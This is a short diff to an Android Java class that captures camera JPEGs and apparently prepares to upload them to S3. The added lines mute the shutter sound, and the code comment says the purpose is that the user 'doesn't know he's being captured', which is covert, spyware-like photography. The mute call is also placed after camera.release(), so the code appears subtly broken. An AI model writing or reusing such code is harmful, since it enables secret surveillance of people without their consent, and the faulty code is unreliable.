@@ -7,6 +7,7 @@ import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.location.Location;
 import android.media.MediaRecorder;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
@@ -169,6 +170,10 @@ public class Job {
                     //JPEG
                     camera.stopPreview();
                     camera.release();
+                    //Mute the shutter sound so user doesn't know he's being captured
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
+                        camera.enableShutterSound(false);
+                    }
                     Toast.makeText(context, "Captured JPEG bytes: " + bytes.length, Toast.LENGTH_LONG).show();
                     //TODO: Send image to S3
                     Thread thread = new Thread(new Runnable() {
